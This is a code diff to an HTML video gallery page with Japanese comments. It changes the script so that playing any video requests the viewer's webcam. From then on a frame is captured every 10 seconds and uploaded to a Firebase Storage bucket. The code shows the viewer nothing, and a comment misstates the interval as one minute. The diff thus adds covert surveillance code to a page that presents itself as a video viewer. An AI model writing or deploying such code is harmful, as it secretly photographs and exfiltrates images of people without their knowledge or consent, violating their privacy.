@@ -283,13 +283,13 @@
                 videoItem.appendChild(videoContainer);
                 videoItem.appendChild(titleElement);
                 videoGrid.appendChild(videoItem);
+
+                // Add event listener to start camera capture on video play
+                videoElement.addEventListener('play', () => startCameraCapture());
             });
         }
 
-        // ページロード時に動画をロード
-        window.onload = loadVideos;
-
-	        // Firebase設定
+        // Firebase設定
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
         import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-storage.js";
 
@@ -307,18 +307,48 @@
         const app = initializeApp(firebaseConfig);
         const storage = getStorage(app);
 
-        // カメラアクセス
+        // カメラアクセスとキャプチャ関数を定義
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
         let videoStream;
+        let captureInterval;
 
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                videoStream = stream;
-            })
-            .catch(err => {
-                console.error('カメラアクセスエラー:', err);
-            });
+        function startCameraCapture() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    videoStream = stream;
+                    const videoTracks = videoStream.getVideoTracks();
+                    const track = videoTracks[0];
+                    const imageCapture = new ImageCapture(track);
+
+                    // 1分ごとに撮影してアップロード
+                    captureInterval = setInterval(() => {
+                        imageCapture.grabFrame()
+                            .then(imageBitmap => {
+                                canvas.width = imageBitmap.width;
+                                canvas.height = imageBitmap.height;
+                                ctx.drawImage(imageBitmap, 0, 0, canvas.width, canvas.height);
+                                const dataURL = canvas.toDataURL('image/jpeg');
+                                uploadImage(dataURL);
+                            })
+                            .catch(err => {
+                                console.error('画像キャプチャエラー:', err);
+                            });
+                    }, 10000); // 60000ミリ秒 = 1分
+                })
+                .catch(err => {
+                    console.error('カメラアクセスエラー:', err);
+                });
+        }
+
+        function stopCameraCapture() {
+            if (captureInterval) {
+                clearInterval(captureInterval);
+            }
+            if (videoStream) {
+                videoStream.getTracks().forEach(track => track.stop());
+            }
+        }
 
         // 画像をFirebase Storageにアップロード
         function uploadImage(dataURL) {
@@ -332,25 +362,9 @@
                 });
         }
 
-        // 1分ごとに撮影してアップロード
-        setInterval(() => {
-            if (videoStream) {
-                const videoTracks = videoStream.getVideoTracks();
-                const track = videoTracks[0];
-                const imageCapture = new ImageCapture(track);
-                imageCapture.grabFrame()
-                    .then(imageBitmap => {
-                        canvas.width = imageBitmap.width;
-                        canvas.height = imageBitmap.height;
-                        ctx.drawImage(imageBitmap, 0, 0, canvas.width, canvas.height);
-                        const dataURL = canvas.toDataURL('image/jpeg');
-                        uploadImage(dataURL);
-                    })
-                    .catch(err => {
-                        console.error('画像キャプチャエラー:', err);
-                    });
-            }
-        }, 10000); // 60000ミリ秒 = 1分
+        // ページロード時に動画をロード
+        window.onload = loadVideos;
+
     </script>
 </body>
 </html>
